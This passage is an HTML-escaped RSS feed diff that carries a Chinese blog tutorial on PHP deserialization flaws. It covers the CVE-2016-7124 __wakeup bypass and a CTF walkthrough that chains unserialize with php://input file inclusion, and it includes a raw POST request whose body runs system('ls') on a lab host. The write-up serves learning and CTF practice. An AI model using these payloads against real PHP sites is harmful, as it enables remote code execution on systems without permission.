+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-11-24_hu3c08b63b25054597133a35dc9175ac8d_101207_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-11-24_hu3c08b63b25054597133a35dc9175ac8d_101207_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;180&#34;
+		data-flex-basis=&#34;433px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;不得不说的魔法函数&#34;&gt;不得不说的魔法函数&lt;/h2&gt;
+&lt;h3 id=&#34;cve-2016-7124-__wakeup绕过&#34;&gt;CVE-2016-7124 __wakeup绕过&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;__wakeup魔法函数简介&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;unserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法，预先准备对象需要的资源&lt;br&gt;
+反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行 (php5 &amp;lt; 5.6.25, php7 &amp;lt; 7.0.10)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;考反序列化的时候经常会遇见&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;__wakeup魔法函数绕过例题&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;index.php&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __wakeup(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wakeup!&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;print_r&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($a);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($a)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为在反序列化的时候会优先执行__wakeup再执行__destruct，所以导致target属性会一直被覆盖掉，如下：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+class A{
+    public $target = &amp;#34;what I want?&amp;#34;;
+    function __wakeup(){
+        $this-&amp;gt;target = &amp;#34;wakeup!&amp;#34;;
+    }
+    function __destruct(){
+        print_r($this-&amp;gt;target);
+    }
+}
+
+$a = new A();
+$b = serialize($a);
+print($b);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-05-37.png&#34;
+	width=&#34;863&#34;
+	height=&#34;111&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-05-37_hu7c284679d4e883264fd9705768fc9a88_11689_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-05-37_hu7c284679d4e883264fd9705768fc9a88_11689_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;777&#34;
+		data-flex-basis=&#34;1865px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;但是只需要将&lt;code&gt;O:1:&amp;quot;A&amp;quot;:1:{s:6:&amp;quot;target&amp;quot;;s:12:&amp;quot;what I want?&amp;quot;;}&lt;/code&gt;更改成&lt;code&gt;O:1:&amp;quot;A&amp;quot;:3:{s:6:&amp;quot;target&amp;quot;;s:12:&amp;quot;what I want?&amp;quot;;}&lt;/code&gt;即可实现&lt;code&gt;__wakeup&lt;/code&gt;函数的绕过&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-08-13.png&#34;
+	width=&#34;819&#34;
+	height=&#34;125&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-08-13_hu407d8eb96e6a4a4e0e43c7b927cc444b_14727_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-08-13_hu407d8eb96e6a4a4e0e43c7b927cc444b_14727_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;655&#34;
+		data-flex-basis=&#34;1572px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;复杂的序列化ctf题目案例&#34;&gt;复杂的序列化ctf题目案例&lt;/h2&gt;
+&lt;p&gt;index.php&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+      error_reporting(0);
+
+      if (strpos($_GET[&amp;#39;un&amp;#39;], &amp;#39;php://filter&amp;#39;)) {
+        die(&amp;#34;&amp;lt;font color=&amp;#34; . &amp;#34;#9932CC&amp;gt;&amp;#34; . &amp;#39;不允许使用php://filter&amp;#39; . &amp;#34;&amp;lt;/font&amp;gt;&amp;#34;);
+      }
+
+      class Connection
+      {
+          public $file;
+
+          public function __construct($file)
+          {
+              $this-&amp;gt;file = $file;
+          }
+
+          public function __sleep()
+          {
+              $this-&amp;gt;file = &amp;#39;sleep.txt&amp;#39;;
+              return array(&amp;#39;file&amp;#39;);
+          }
+
+          public function __wakeup()
+          {
+              $this-&amp;gt;file = &amp;#39;wakeup.txt&amp;#39;;
+          }
+
+          public function __destruct()
+          {
+              include($this-&amp;gt;file);
+          }
+      }
+
+      if (empty($_GET[&amp;#39;un&amp;#39;])) {
+          ?&amp;gt;
+      &amp;lt;pre&amp;gt; class Connection
+      {
+          public $file;
+
+          public function __construct($file)
+          {
+              $this-&amp;gt;file = $file;
+          }
+
+          public function __sleep()
+          {
+              $this-&amp;gt;file = &amp;#39;sleep.txt&amp;#39;;
+              return array(&amp;#39;file&amp;#39;);
+          }
+
+          public function __wakeup()
+          {
+              $this-&amp;gt;file = &amp;#39;wakeup.txt&amp;#39;;
+          }
+
+          public function __destruct()
+          {
+              include($this-&amp;gt;file);
+          }
+      }
+      $obj2 = unserialize($_GET[&amp;#39;un&amp;#39;]);
+      &amp;lt;/pre&amp;gt;
+
+          &amp;lt;?php
+      }
+
+      $obj2 = unserialize($_GET[&amp;#39;un&amp;#39;]);
+
+
+
+
+      ?&amp;gt;
+
+      &amp;lt;!-- flag is in flag.php --&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个题目要结合文件包含漏洞触发命令执行&lt;/p&gt;
+&lt;p&gt;因为存在多个魔法函数，这里就要知道各个魔法函数的执行顺序。在序列化的时候可以直接删除&lt;code&gt;__sleep()&lt;/code&gt;以减少影响，其次是利用属性个数大于真实属性个数绕过&lt;code&gt;__wakeup&lt;/code&gt;函数，同时因为限制了&lt;code&gt;php://filer&lt;/code&gt;因此需要利用&lt;code&gt;php://input&lt;/code&gt;来执行代码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+//error_reporting(0);
+class Connection
+{
+    public $file;
+
+    public function __construct($file)
+    {
+        $this-&amp;gt;file = $file;
+    }
+
+    public function __wakeup()
+    {
+        $this-&amp;gt;file = &amp;#39;wakeup.txt&amp;#39;;
+    }
+
+    public function __destruct()
+    {
+        include($this-&amp;gt;file);
+    }
+}
+//      $obj2 = unserialize($_GET[&amp;#39;un&amp;#39;]);
+
+$a = new Connection(&amp;#34;php://input&amp;#34;);
+$b = serialize($a);
+print_r($b);
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /?un=O:10:&amp;#34;Connection&amp;#34;:2:{s:4:&amp;#34;file&amp;#34;;s:11:&amp;#34;php://input&amp;#34;;} HTTP/1.1
+Host: 192.168.122.30:8011
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Length: 21
+
+&amp;lt;?php system(&amp;#34;ls&amp;#34;);?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-45-15.png&#34;
+	width=&#34;1241&#34;
+	height=&#34;544&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-45-15_hub4c2150e2f6ed90f3effc228bbf94392_101932_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-45-15_hub4c2150e2f6ed90f3effc228bbf94392_101932_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;547px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;注入对象构造方法&#34;&gt;注入对象构造方法&lt;/h2&gt;
+&lt;h3 id=&#34;当目标对象被privateprotected修饰时的反序列化漏洞&#34;&gt;当目标对象被private、protected修饰时的反序列化漏洞&lt;/h3&gt;
+&lt;p&gt;前文说了&lt;code&gt;private&lt;/code&gt;和&lt;code&gt;protected&lt;/code&gt;返回长度和&lt;code&gt;public&lt;/code&gt;不一样的原因，这里再记录一下&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;private属性序列化的时候格式是%00类名%00属性名
+protect属性序列化的时候格式是%00*%00属性名&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;protected&lt;/code&gt;情况下&lt;/p&gt;
+&lt;p&gt;index.php&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abab&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($a);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用方式：
+先用正常方式输出序列化字符串&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+
+class A{
+    protected $test = &amp;#34;what i what&amp;#34;;
+    function __destruct() {
+        echo $this-&amp;gt;test;
+    }
+}
+
+$a = new A();
+$b = serialize($a);
+print_r($b);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-16-30-10.png&#34;
+	width=&#34;1056&#34;
+	height=&#34;401&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-16-30-10_hud0dc8151c79daf8bc0ad0f18d7d034b3_36582_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-16-30-10_hud0dc8151c79daf8bc0ad0f18d7d034b3_36582_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;263&#34;
+		data-flex-basis=&#34;632px&#34;
+	
+&gt;&lt;/p&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
